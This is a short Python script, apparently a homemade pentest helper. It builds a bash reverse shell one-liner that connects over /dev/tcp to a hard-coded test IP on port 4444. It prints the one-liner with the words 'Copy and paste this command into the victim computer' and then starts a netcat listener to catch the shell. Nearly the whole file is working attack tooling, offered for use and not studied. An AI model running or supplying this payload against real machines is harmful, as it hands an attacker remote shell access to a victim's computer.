import os #for outputting command line commands - for setting up listener at the end

class Colour:                    #class of all the colours we may use
    Black = "\u001b[30m"
    Red = "\u001b[31m"
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"
    Cyan = "\u001b[36m"
    Reset = "\u001b[0m"
    # Theme
    Colour1 = Green
    Colour2 = Cyan
    Colour3 = Red
    Colour4 = White
    Text = Yellow

def display(text): #display in a format similar to other tools for prompt text
    print(f"\n{Colour.Blue}[{Colour.Red}+{Colour.Blue}]{Colour.Text} {text}{Colour.Reset}\n")


ip = "172.26.90.233" #IP address set for testing
port = "4444" #Port set for testing

code = '0<&196;exec 196<>/dev/tcp/@/£; sh <&196 >&196 2>&196' #random reverse shell code chosen for testing
listener = "netcat -lvnp £" #listener used for reverse shell code

code = code.replace("@",ip)
code = code.replace("£",port)
listener = listener.replace("£",port)
#replace the @ and £ symbols with ip address and port as necessary
text = "Copy and paste this command into the victim computer:\n" + code
display(text) #display code
os.system(listener) #start listener and wait for connection
